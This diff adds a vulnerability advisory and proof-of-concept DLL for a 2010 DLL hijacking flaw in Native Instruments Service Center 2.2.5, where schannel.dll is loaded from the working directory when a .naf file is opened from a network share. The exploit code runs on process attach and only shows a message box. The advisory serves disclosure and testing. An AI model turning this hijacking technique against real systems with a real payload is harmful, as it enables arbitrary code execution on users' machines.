@@ -1,0 +1,55 @@
+/*
+
+ Native Instruments Service Center 2.2.5 Insecure Library Loading Vulnerability
+
+
+ Vendor: Native Instruments GmbH
+ Product web page: http://www.native-instruments.com
+ Affected version: 2.2.5 (R596)
+
+ Summary: The NI Service Center is a service used for Product Activation.
+
+ Desc: The Service Center suffers from a DLL hijacking vulnerability, which could be
+ exploited by remote attackers to compromise a vulnerable system. This issue is
+ caused due to the application insecurely loading certain libraries ("schannel.dll")
+ from the current working directory, which could allow attackers to execute arbitrary
+ code by tricking a user into opening an activation return file (.naf) from a network
+ share.
+
+ Tested on: Microsoft Windows XP Professional SP3 (English)
+
+ Vulnerability discovered by: Gjoko 'LiquidWorm' Krstic
+ liquidworm gmail com
+
+ Zero Science Lab - http://www.zeroscience.mk
+
+ Advisory ID: ZSL-2010-4975
+ Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4975.php
+
+ 06.11.2010
+
+*/
+
+
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+
+	switch (fdwReason)
+	{
+		case DLL_PROCESS_ATTACH:
+		dll_mll();
+		case DLL_THREAD_ATTACH:
+		case DLL_THREAD_DETACH:
+		case DLL_PROCESS_DETACH:
+		break;
+	}
+
+	return TRUE;
+}
+
+int dll_mll()
+{
+	MessageBox(0, "DLL Hijacked!", "DLL Message", MB_OK);
+}
